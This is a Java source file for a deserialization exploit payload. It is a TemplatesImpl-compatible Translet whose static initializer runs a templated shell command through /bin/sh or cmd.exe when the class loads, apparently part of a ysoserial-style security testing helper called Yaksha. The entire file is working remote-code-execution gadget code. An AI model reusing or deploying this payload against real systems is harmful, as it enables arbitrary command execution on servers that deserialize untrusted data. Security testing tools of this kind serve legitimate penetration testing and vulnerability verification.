package payload;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.File;
import java.io.IOException;

/**
 * Java 8 TemplatesImpl-compatible command template used by Yaksha's bounded
 * YSO helper. The checked-in Go bytecode constant is compiled from this source.
 */
public class RuntimeExecTranslet extends AbstractTranslet {
    static {
        String command = "{{cmd}}";
        String[] argv;
        if (File.separator.equals("/")) {
            argv = new String[]{"/bin/sh", "-c", command};
        } else {
            argv = new String[]{"cmd", "/C", command};
        }
        try {
            Runtime.getRuntime().exec(argv);
        } catch (IOException ignored) {
            // Execution evidence is collected out of band by the EXP.
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
